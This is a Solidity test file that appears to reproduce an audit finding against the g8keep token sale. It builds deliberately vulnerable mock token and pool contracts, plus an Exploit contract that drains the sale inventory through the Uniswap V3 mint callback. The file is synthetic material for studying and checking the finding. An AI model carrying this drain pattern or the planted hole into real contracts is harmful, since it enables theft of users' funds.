// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  g8keep — buy() credits the Uniswap V3 pool while transfer() to that pool
    reverts until migration (Pashov, H-03, finding 65000).
    SYNTHETIC, cheatcode-free. The mint callback check is the audited snippet.
    The attacker has an empty token balance. buy(pool) moves 1_000_000 tokens
    out of the sale inventory, the pool mints that much LP, and burning the
    LP pays the attacker the inventory. The control migrates, transfers the
    caller's own tokens into the pool first, and leaves the inventory untouched. */

library SafeMath65000 {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
}

contract SaleToken {
    using SafeMath65000 for uint256;

    address public constant INVENTORY = address(uint160(0xBEEF));
    uint256 public constant STOCK = 1_000_000 ether;

    mapping(address => uint256) public balanceOf;
    address public pool;
    bool public migrated;

    constructor() {
        balanceOf[INVENTORY] = STOCK;
    }

    function setPool(address p) external {
        pool = p;
    }

    function migrate() external {
        migrated = true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (to == pool && !migrated) revert("not migrated");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function buy(address to, uint256 amount) external {
        // @> VULN: buy credits the Uniswap V3 pool even though transfer() to the pool is blocked
        balanceOf[INVENTORY] -= amount;
        balanceOf[to] += amount;
    }
}

interface IUniswapV3MintCallback {
    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract UniPool {
    using SafeMath65000 for uint256;

    SaleToken public token0;
    mapping(address => uint256) public liquidityOf;

    constructor(SaleToken _token) {
        token0 = _token;
        _token.setPool(address(this));
    }

    function balance0() public view returns (uint256) {
        return token0.balanceOf(address(this));
    }

    function mint(address recipient, uint256 amount0, uint256 amount1, bytes calldata data)
        external
        returns (uint256 liquidity)
    {
        uint256 balance0Before;
        uint256 balance1Before;
        if (amount0 > 0) balance0Before = balance0();
        if (amount1 > 0) balance1Before = balance1();
        IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, data);
        if (amount0 > 0) require(balance0Before.add(amount0) <= balance0(), "M0");
        if (amount1 > 0) require(balance1Before.add(amount1) <= balance1(), "M1");
        liquidity = amount0;
        liquidityOf[recipient] += liquidity;
    }

    function balance1() public pure returns (uint256) {
        return 0;
    }

    function burn(uint256 liquidity) external returns (uint256 amount0) {
        liquidityOf[msg.sender] -= liquidity;
        amount0 = liquidity;
        token0.transfer(msg.sender, amount0);
    }
}

contract Exploit {
    uint256 public constant STOLEN = 1_000_000 ether;

    SaleToken public token;
    UniPool public pool;
    uint256 public lpMinted;
    uint256 public attackerBalanceBefore;

    constructor() {
        token = new SaleToken();
        pool = new UniPool(token);
    }

    function uniswapV3MintCallback(uint256 amount0, uint256, bytes calldata) external {
        token.buy(msg.sender, amount0);
    }

    function run() external {
        attackerBalanceBefore = token.balanceOf(address(this));
        require(attackerBalanceBefore == 0, "attacker should be empty");
        uint256 minted = pool.mint(address(this), STOLEN, 0, "");
        lpMinted = minted;
        require(minted == STOLEN, "lp against empty balance");
        uint256 out = pool.burn(minted);
        require(out == STOLEN, "withdrew inventory");
        require(token.balanceOf(address(uint160(0xBEEF))) == 0, "inventory drained");
        require(token.balanceOf(address(this)) == STOLEN, "attacker received N");
    }
}
